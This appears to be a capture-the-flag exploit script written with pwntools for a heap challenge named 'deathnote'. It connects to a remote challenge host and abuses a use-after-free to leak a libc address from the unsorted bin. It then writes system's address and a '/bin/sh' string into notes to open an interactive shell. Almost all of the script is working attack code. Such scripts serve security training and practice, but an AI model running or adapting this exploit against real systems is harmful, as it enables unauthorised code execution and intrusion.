#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("challenge/deathnote_patched")
libc = ELF("challenge/glibc/libc.so.6")
ld = ELF("challenge/glibc/ld-linux-x86-64.so.2")
context.binary = exe

host = "94.237.62.117"
port = 36994

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions
menu_choice = b"|_-_-_-_-_-_-_-_-_-_-_|"
def CREATE(size: int, idx: int, name: bytes=b'a'):
    sla(menu_choice, b"1")
    sla(b"How big is your request?", str(size).encode())
    sla(b"Page?", str(idx).encode())
    sla(b"Name of victim:", name)

def REMOVE(idx: int):
    sla(menu_choice, b"2")
    sla(b"Page?", str(idx).encode())

def SHOW(idx: int):
    sla(menu_choice, b"3")
    sla(b"Page?", str(idx).encode())

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
breakrva 0x019D5 
breakrva 0x01820
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# leak libc through dangling pointer of unsortedbin
for i in range(1, 10):
    info(f"create page {i}")
    CREATE(0x80, i)
    
for i in range(1, 9):
    info(f"free page {i}")
    REMOVE(i)
    
SHOW(8)
io.recvuntil(b"Page content: ")
leaked_unsorted_arena = u64(io.recv(6).ljust(8, b'\x00'))
diff = 0x21ace0
libc.address = leaked_unsorted_arena - diff
success(f"libc.address: {hex(libc.address)}")
# ---------------------------

# trigger system('/bin/sh\x00')
CREATE(0x10, 0, hex(libc.sym['system']))
CREATE(0x10, 1, b"/bin/sh\x00")
s(b"42")
# ---------------------------

io.interactive()

